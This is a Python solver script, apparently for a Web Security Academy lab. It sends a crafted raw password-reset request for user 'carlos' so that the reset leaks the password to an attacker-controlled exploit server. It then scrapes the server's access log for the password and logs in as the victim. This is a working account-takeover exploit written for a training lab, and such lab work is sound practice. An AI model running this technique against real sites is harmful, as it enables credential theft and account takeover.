from web_security_academy.core.logger import logger
from web_security_academy.core.utils import render_template_file

from urllib.parse import urlparse
import re


def solve_lab(session):
    csrf = session.get_csrf_token("/forgot-password")
    exploit_server = session.exploit_server()
    req = render_template_file(
        "http.txt",
        lab_host=urlparse(session.url).hostname,
        exploit_server_host=exploit_server.hostname,
        session=session.cookies["session"],
        _lab=session.cookies["_lab"],
        data=f"csrf={csrf}&username=carlos",
    ).replace("\n", "\r\n")

    session.send_raw(req.encode())
    logger.info("Sent the following HTTP request:")
    print(req)

    logger.info("Extracting password from exploit server log...")
    log = exploit_server.access_log()
    passwords = re.findall(r"password:\+([A-Za-z0-9]+)</p>", log)
    if len(passwords) == 0:
        logger.failure("Unable to extract password.")
        return

    password = passwords[-1]
    logger.info(f"Password: {password}")
    session.login("carlos", password)
